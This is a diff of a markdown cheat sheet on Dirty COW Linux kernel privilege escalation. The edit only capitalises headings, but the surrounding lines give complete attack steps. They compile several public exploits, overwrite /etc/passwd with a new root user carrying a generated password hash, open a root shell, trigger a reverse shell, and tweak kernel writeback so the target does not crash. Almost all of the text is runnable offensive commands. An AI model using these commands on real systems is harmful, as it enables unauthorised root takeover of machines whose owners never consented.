@@ -13,12 +13,12 @@ uname -a
 gcc -pthread 40611.c -o dirtyc0w
 ```
 
-### add new user and password to /etc/passwd
+### Add new user and password to /etc/passwd
 ```
 ./dirtyc0w /etc/passwd "<user>:$(openssl passwd -1 -salt <user> <password>):0:0:root:/bin/bash" &
 ```
 
-### change to root shell
+### Change to root shell
 ```
 su <user>
 ```
@@ -28,12 +28,12 @@ su <user>
 gcc -pthread 40839.c -o dirty -lcrypt
 ```
 
-### append new user to /etc/passwd
+### Append new user to /etc/passwd
 ```
 ./dirty <password> /etc/passwd
 ```
 
-### change to root shell
+### Change to root shell
 ```
 su firefart
 ```
@@ -44,22 +44,22 @@ https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/
 gcc cowroot.c -o cowroot -pthread
 ```
 
-### pop root shell
+### Pop root shell
 ```
 ./cowroot
 ```
 
-### disable dirty writeback may prevent machine from crash
+### Disable dirty writeback may prevent machine from crash
 ```
 echo 0 > /proc/sys/vm/dirty_writeback_centisecs
 ```
 
-### compile on target 40847.cpp
+### Compile on target 40847.cpp
 ```
 g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 ```
 
-### pop reverse shell (automatically disable dirty writeback)
+### Pop reverse shell (automatically disable dirty writeback)
 ```
 ./dcow -s
 ```
